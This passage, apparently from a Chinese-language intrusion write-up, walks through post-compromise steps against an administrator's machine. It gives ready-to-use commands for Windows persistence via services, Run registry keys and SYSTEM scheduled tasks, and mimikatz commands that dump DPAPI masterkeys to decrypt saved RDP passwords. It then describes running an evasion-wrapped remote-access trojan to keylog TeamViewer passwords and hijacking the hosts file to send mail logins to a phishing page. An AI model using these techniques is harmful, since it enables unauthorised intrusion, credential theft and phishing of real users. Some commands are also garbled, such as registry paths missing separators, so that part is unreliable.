3 持久化

  

分享几个快速维稳的方法：

## 1.服务启动

1.  shell sc create "服务名" binpath= "要执行的命令"   //创建系统服务
    
2.  shell sc config "刚刚创建的服务名" start= auto //我们需要把这个服务设置为自动运行。
    
3.  shell sc description "刚刚创建的服务名" "服务描述"  //设置服务的描述字符
    
4.  shell net start "服务名称"  //启动服务
    

## 2.注册表启动

1.  shell REG query “HKLMSOFTWAREMicrosoftWindowsCurrentRun”
    
2.  shell REG query “HKLMSOFTWAREMicrosoftWindowsCurrentRun” /V “名称” /t REG\_SZ /F /D “文件路径”
    

## 3.高权限计划定时任务启动

1.  shell schtasks /creat /RL HIGHEST /F /tn “名称” /tr “路径” /sc DAILY /mo 1 /ST 10:05 /RU SYSTEM
    
2.  shell schtasks /query | findstr “名称”
    
3.  shell schtasks /run /tn “名称”
    

## 4.低权限计划定时任务启动

1.  shell schtasks /creat /RL HIGHEST /F /tn “名称” /tr “路径” /sc DAILY /mo 1 /ST 10:05
    
2.  shell schtasks /query | findstr “名称”
    
3.  shell schtasks /run /tn “名称”

5 从管理员本机到vps

  

我们得知了，在他的机器上保存了两个rdp凭据，我们只要从C:Users<用户名>AppDataLocalMicrosoftCredentials\*目录下把凭据下载回来并通过mimikatz拿到对应的masterkey就可以从他本地保存的凭据中解密出对应的rdp密码。mimikatz需要执行以下命令

mimikatz privilege::debug sekurlsa::dpapi

当时操作没截图，只保留了结果，简单看下吧，反正也要打码 

![](../Images/858dc7f6d85d9ebd62c89375377e9325.png)

然后将保存的session文件下载下来 

执行以下命令即可解出密码

1.  mimikatz "dpapi::cred /in:你下载下来的session路径 /masterkey:对应的masterkey"

6 从管理员本机到全部TeamViewer沦陷

  

从他电脑屏幕截图得知他本机装有TeamViewer，由于我太菜，cs的插件太少功能我不够我玩，于是我决定用大灰狼进行后续的操作。大灰狼套个mfc实现免杀，大灰狼上线后，开启屏幕监控，在管理员使用TeamViewer的时候kill掉他的TeamViewer进程，然后开启键盘记录，记录他的TeamViewer密码，经过一系列操作，最终获取到全部权限

![](../Images/2750300127617a71484a37f6081f4a96.png)

7 从管理员本机到邮箱沦陷

  

经过一系列信息收集我们得知，管理员的邮箱中有我们需要的东西，我们需要得到管理员的邮箱密码，但是通过一段时间的监视后发现，管理员使用邮箱都是通过扫码形式登陆，不能通过键盘记录获取密码。最终，决定修改他的host，将他电脑上的\*63邮箱登陆地址和\*q邮箱的登陆地址强制劫持到我的钓鱼页面上，并对前端进行修改，把他扫码登陆那个地方注释掉，强制管理员必须手动输入账号密码。当获得管理员账号密码后再将修改的host删掉，成功获得明文账号密码，被劫持后访问两个url大概下面这样子 

![](../Images/fbd5752306e37a554df8d915add387b4.png)![](../Images/08c5ec65f3f66ce50d3a9105abe258e2.png)
